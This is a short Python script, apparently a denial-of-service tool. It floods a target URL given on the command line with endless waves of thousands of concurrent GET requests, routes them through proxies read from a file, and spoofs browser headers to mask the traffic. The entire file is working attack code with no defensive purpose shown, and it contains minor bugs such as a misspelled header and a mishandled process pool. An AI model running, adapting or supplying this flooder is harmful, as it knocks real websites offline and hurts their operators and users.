import time
import asyncio
import sys
import random
import aiohttp
from multiprocessing import Pool
from aiohttp import ClientSession

proxies = []
tasks = []

async def hello(target):
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36',
               'Aceept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
               'Accept-Encoding':'gzip, deflate, br',
               'Accept-Language':'zh-CN,zh;q=0.9',
               'Pragma': 'no-cache',
               'Cache-Control': 'no-cache',
               'Sec-Fetch-Dest': 'document',
               'Sec-Fetch-Mode': 'navigate',
               'Sec-Fetch-Site': 'cross-site',
               'Sec-Fetch-User': '?1',
               'Upgrade-Insecure-Requests': '1'}
    conn = aiohttp.TCPConnector(limit=0)
    async with ClientSession(connector=conn) as session:
        async with session.get(str(target),headers=headers,proxy='http://'+random.choice(proxies)) as response:
            response = await response.read()

def run(target):
    for i in range(8888):
        task = asyncio.ensure_future(hello(target))
        tasks.append(task)

def ensure(target):
    loop = asyncio.get_event_loop()
    while True:
        run(target)
        loop.run_until_complete(asyncio.wait(tasks))
        
if __name__ == '__main__':

    target = sys.argv[1]
    with open ('se.txt','r') as f:
        for line in f.readlines():
            proxies.append(str(line.strip()))
    p = Pool()
    for i in range(8):
        p.apply_async(ensure(target))
    p.close()
    
